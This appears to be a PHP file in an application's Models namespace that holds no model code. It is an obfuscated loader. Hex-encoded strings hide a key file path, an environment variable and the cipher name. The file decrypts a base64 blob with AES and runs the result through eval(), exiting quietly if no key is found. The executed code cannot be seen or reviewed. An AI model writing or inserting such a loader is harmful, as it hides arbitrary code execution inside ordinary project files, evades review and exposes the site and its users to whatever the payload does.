<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('SrCNtq/13npnHow8t4e1YQ==');

$c=base64_decode(

'MIO/XtekZbZO4on5khcYFnF8JK3y+M/f3Z149UF2NUbA9BjlVO5apExu84dx6zhlmnPw/+9jTQ17' .
'dvOY9+bDqesNi6k7aQF1IKiedm4UKmL4cA5xDqvNwAO5p3a8wvCbE5VFyd/TgWb12QPJsCKjheNh' .
'h6QNcNx9wmYC3pvP6vTN2t6nMJq75H4of0KALcTi+xtBEhZe06DgutxL4T0QUKfiUNyb6T/bSHp5' .
'tdrbihikv8TE6jJlbTFm/BalAucm63N4f1XB+iQyetdlzOvrEqz+wDGW2fnQMUsBo41PsE36mPBb' .
'D+ox+VTqFMz5X62nNk51WCYErA1WgLeW/FzrHyexM6hKjMYDDSivjdLJ2PZGDNSBwpi1FlLyNT2c' .
'lqdOIxzqjN2L7+i5DK54VViIfMfiLuOUpgPmapBYR0cj+4rcwzfQ/YJxtGHSCzC7xAN7PpHDLd1+' .
'eqcaJyHf9KS/RQOJTukskytF0IXNNQT+VQhZXVn4IPPdV5/qz4vxutYLBZWhb2jYgw7reiBzITt7' .
'sN9vj4fY05+GSXhkkbBF5dQ1Byl7w4mhfaY6Ak9yke+ElsPglvCKv/ZPPy5dOgctCj6v5EcX1jg4' .
'cBxn0M02sI769DWl5g2IkK7rsMxrOrruImDH4ipLTZ2fRz8/8s5AVGXnA1e8/GbCIrNONfAxg5P/' .
'myWUxEpxrdzte1oeGbfxkYfOgcKoJ/KUpNFNiNv3pRvMGfjNz6AYEPRfv1mcq5bsb86s28Xdd6X4' .
'UvQqFR7k/LPUmzbmwv8ZMKppEVqUtA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

